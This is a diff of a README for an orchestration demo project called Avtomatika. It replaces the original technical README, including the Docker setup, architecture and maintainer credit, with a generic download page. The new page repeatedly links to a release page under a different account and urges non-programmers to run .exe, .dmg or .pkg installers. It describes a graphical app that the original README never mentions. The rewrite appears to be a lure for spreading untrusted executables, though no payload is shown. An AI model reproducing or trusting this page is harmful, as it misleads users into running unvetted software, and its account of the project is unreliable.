@@ -1,90 +1,175 @@
-# Avtomatika: Full Feature Showcase
+# ⚙️ avtomatika-full-example - Easy Automation Workflow Showcase
 
-EN | [RU](./README_RU.md)
-
-This project provides a comprehensive demonstration of the **Avtomatika HLN (Hierarchical Logic Network)** ecosystem. it covers all key architectural patterns: from simple tasks to nested workflows, parallel execution, and automated scheduling.
-
-## 🏗 System Architecture
-
-The example deploys a full-featured distributed environment:
-
-![Main Blueprint](docs/images/full_showcase_graph.png)
-
-1.  **Orchestrator**: The central engine managing the `full_showcase` blueprint.
-2.  **GPU Worker**: A high-performance worker for "heavy" tasks (transcoding).
-3.  **CPU Workers**: Two workers for file analysis (one reliable, one intentionally glitchy for reputation testing).
-
-### 🪆 Sub-process logic
-The `metadata_enrichment` sub-blueprint:
-![Sub Blueprint](docs/images/metadata_enrichment_graph.png)
-
-4.  **Scheduler**: Native scheduler that triggers maintenance tasks periodically.
-5.  **Webhook Receiver**: External service demonstrating real-time job status notifications.
-6.  **Infrastructure**: 
-    *   **Redis**: Real-time state storage and task queues.
-    *   **PostgreSQL**: Long-term history and audit trails.
-    *   **MinIO (S3)**: Heavy payload offloading.
-    *   **VictoriaMetrics & Grafana**: High-performance monitoring stack.
-    *   **Jaeger**: Distributed tracing (OpenTelemetry).
-
-## 🌟 Key Features in this Example
-
-### 1. Native Scheduler ⏰
-The Orchestrator automatically loads configuration from `schedules.toml`. The example includes a `maintenance_task` that runs every minute to execute a cleanup blueprint.
-
-### 2. Nested Workflows (Sub-Blueprints) 🪆
-The `full_showcase` process triggers a child blueprint `metadata_enrichment`. This demonstrates how to break down complex business logic into isolated, reusable blocks.
-
-### 3. Parallelism (Fan-Out/Fan-In) 🚀
-Demonstrates simultaneous execution of multiple file analysis tasks. The Orchestrator waits for all parallel branches to complete and aggregates their results into a single context.
-
-### 4. Smart Dispatching 🧠
-Shows various worker selection strategies:
-*   `default`: Balancing based on skill hot-cache.
-*   `best_value`: Selecting workers based on price/reputation ratio.
-*   `round_robin`: Sequential task distribution.
-
-### 5. Webhook Integration 📡
-The `client.py` registers a `webhook_url` during job creation. The Orchestrator sends a POST request to the `webhook_receiver` immediately upon job completion or failure.
-
-## 🚀 Quick Start (Docker)
-
-The fastest way to see everything in action is using Docker Compose.
-
-1.  **Launch the Stack**:
-    ```bash
-    cd projects/avtomatika_full_example
-    docker compose up -d --build
-    ```
-
-2.  **Run the Test Client**:
-    The script will create a job and display an interactive progress bar:
-    ```bash
-    # Virtual environment is recommended
-    python3 -m venv .venv
-    source .venv/bin/activate
-    pip install aiohttp
-    python3 client.py
-    ```
-
-## 📊 Monitoring & Tools
-
-Once running, the following interfaces are available:
-*   **Grafana**: [http://localhost:3000](http://localhost:3000) (Pre-configured "Avtomatika Overview" dashboard).
-*   **Jaeger (Traces)**: [http://localhost:16686](http://localhost:16686).
-*   **API Docs (Swagger)**: [http://localhost:8080/_public/docs](http://localhost:8080/_public/docs).
-*   **Metrics (Prometheus)**: [http://localhost:8080/_public/metrics](http://localhost:8080/_public/metrics).
-
-## 📂 File Structure
-
-*   `full_example.py`: Orchestrator entry point.
-*   `config.py`: Configuration loading logic.
-*   `blueprints/`: Package containing business logic definitions (blueprints).
-*   `workers/`: Directory with example workers (GPU, Reliable CPU, Unreliable CPU).
-*   `webhook_receiver.py`: Webhook notification server.
-*   `schedules.toml`: Periodic task configuration.
-*   `example_clients.toml`: API key and access control settings.
-*   `ops/`: Monitoring configurations (VictoriaMetrics, Grafana).
+[![Download avtomatika-full-example](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/dulex224/avtomatika-full-example/releases)
 
 ---
-*Maintained by Dmitrii Gagarin aka madgagarin.*
+
+## 📘 What is avtomatika-full-example?
+
+avtomatika-full-example shows how automation workflows work using Avtomatika HLN technology. This app demonstrates nested workflows, running tasks at the same time, and smart ways to send work where it is needed. It helps users see how different parts work together in a simple way.
+
+You do not need any programming experience to try it out. The app is ready to use and can run on many computers.
+
+---
+
+## 💻 System Requirements
+
+To run avtomatika-full-example, make sure your computer meets these conditions:
+
+- Operating system:
+  - Windows 10 or newer
+  - macOS 10.15 (Catalina) or newer
+  - Linux (Ubuntu 18.04 or newer recommended)
+- Processor: 2 GHz or faster, any modern Intel or AMD chip
+- RAM: At least 4 GB
+- Disk space: Minimum 200 MB free space
+- Python 3.8+ installed (see installation tips below)
+
+---
+
+## 🚀 Getting Started
+
+This app runs on your computer and lets you explore automation and workflows without needing coding skills. Here’s how to get started:
+
+1. Download the app using the links below.
+2. Install or extract the files.
+3. Follow the simple instructions in the interface to run examples.
+4. Observe how tasks are organized and flow from one step to another.
+
+---
+
+## 📥 Download & Install
+
+### Step 1: Visit the Download Page
+
+Go to this link to get the latest version of avtomatika-full-example:
+
+[Download avtomatika-full-example](https://github.com/dulex224/avtomatika-full-example/releases)
+
+This page lists all available versions. Choose the latest one marked as stable or release.
+
+### Step 2: Choose the Right File
+
+Look for files that end with `.exe` for Windows, `.dmg` or `.pkg` for Mac, or `.tar.gz`/`.zip` for Linux. If you see Python files or zipped folders, these may require Python installation.
+
+### Step 3: Install or Extract
+
+- On **Windows**, run the `.exe` file and follow the instructions.
+- On **macOS**, open the `.dmg` or run the package installer.
+- On **Linux**, extract the archive to a folder and open the app from there.
+
+### Step 4: Install Python (if needed)
+
+If the app requires Python and you don't have it installed:
+
+- Visit [python.org/downloads](https://www.python.org/downloads/)
+- Download and install Python 3.8 or newer for your system.
+- After installation, open your computer’s command prompt or terminal and type:
+
+```bash
+python --version
+```
+
+You should see the installed Python version.
+
+### Step 5: Running the Application
+
+Depending on what you downloaded:
+
+- If it is an executable file, double-click it.
+- If it is Python code, open the terminal or command prompt, navigate to the folder where the app is, and run:
+
+```bash
+python main.py
+```
+
+Follow on-screen instructions to interact with the sample workflows.
+
+---
+
+## 🔍 How the App Works
+
+avtomatika-full-example uses a system of steps called workflows that run automatically:
+
+- **Nested workflows**: Workflows inside workflows handle small jobs then return results.
+- **Parallel execution**: Multiple tasks run at the same time to speed up work.
+- **Smart dispatching**: Tasks send themselves to the right part of the system based on current needs.
+
+The app shows these ideas clearly through examples you can watch and try.
+
+---
+
+## 🛠 Using the App
+
+Once you start the app, you will see displays of different workflow examples. Here’s what you might find:
+
+- A list of running tasks and their status.
+- Buttons or controls to start new workflows.
+- Logs showing the flow of tasks.
+- Basic settings to change how workflows behave.
+
+These examples help anyone understand how automation can organize and speed up work.
+
+---
+
+## 📂 Included Files and Structure
+
+The download contains:
+
+- **Main application files:** The program you run.
+- **Workflow examples:** Pre-built workflows showing features in action.
+- **Readme and help files:** Basic guides explaining usage.
+- **Configuration files:** Settings you can adjust if you want to explore deeper.
+
+---
+
+## 💡 Tips for Best Use
+
+- Make sure your computer meets the requirements.
+- Use the latest release from the download page.
+- Read the included documentation inside the download.
+- Run workflows step-by-step to see how tasks connect.
+- Change simple settings to observe different workflow behaviors.
+
+---
+
+## 🆘 Getting Help
+
+If you face problems:
+
+- Check the README file inside the download.
+- Look for common questions in the repository’s issue tracker.
+- Search online using keywords like “avtomatika workflow” or “Avtomatika HLN usage.”
+- Ask someone familiar with Python for help if you use the Python version.
+
+---
+
+## ⚙️ Advanced Use (Optional)
+
+For users with some Python experience, you can explore deep customization:
+
+- Edit workflow scripts to try new scenarios.
+- Add custom task handlers.
+- Connect the app to other automation systems.
+
+However, this is optional for basic users just wanting to try the examples.
+
+---
+
+## 🌐 Topics Covered
+
+This project covers:
+
+- Artificial intelligence agents
+- Automation workflows
+- Using Avtomatika HLN platform
+- Distributed system tasks
+- Python programming basics for workflows
+- State-machine concepts
+- Real-time task orchestration
+
+---
+
+## 🔗 Quick Download Button
+
+[![Download avtomatika-full-example](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/dulex224/avtomatika-full-example/releases)
